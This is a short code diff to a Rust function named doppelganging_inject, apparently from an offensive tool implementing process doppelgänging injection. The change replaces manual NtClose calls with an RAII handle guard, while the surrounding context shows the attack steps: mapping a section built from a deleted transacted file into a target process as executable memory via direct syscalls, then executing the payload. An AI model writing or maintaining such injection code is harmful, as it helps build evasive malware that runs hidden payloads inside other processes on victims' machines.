@@ -1027,6 +1027,7 @@ pub unsafe fn doppelganging_inject(
             let _ = syscall!("NtClose", tx_handle as u64);
             e
         })?;
+    let h_section_guard = crate::nt_handle::NtHandle::new(h_section);
 
     // Close the file handle — the section holds its own reference.
     let _ = syscall!("NtClose", file_handle as u64);
@@ -1079,7 +1080,7 @@ pub unsafe fn doppelganging_inject(
     // ── Step 7: Map section into target process ───────────────────────
     // The section is mapped as PAGE_EXECUTE_READ. The payload data came from
     // a file that no longer exists on disk.
-    let remote_base = map_section_to_process(h_section, process_handle).map_err(|e| {
+    let remote_base = map_section_to_process(h_section_guard.raw(), process_handle).map_err(|e| {
         if is_suspended {
             let _ = syscall!(
                 "NtTerminateProcess",
@@ -1091,7 +1092,7 @@ pub unsafe fn doppelganging_inject(
         if thread_handle != 0 {
             let _ = syscall!("NtClose", thread_handle as u64);
         }
-        let _ = syscall!("NtClose", h_section as u64);
+        // h_section_guard dropped here — NtClose via Drop
         e
     })?;
 
@@ -1131,7 +1132,7 @@ pub unsafe fn doppelganging_inject(
     }
 
     // Close section handle — the target has a mapping that references it.
-    let _ = syscall!("NtClose", h_section as u64);
+    // h_section_guard dropped here — NtClose via Drop.
 
     // ── Step 8: Execute payload ───────────────────────────────────────
     let exec_thread_handle = if is_suspended {
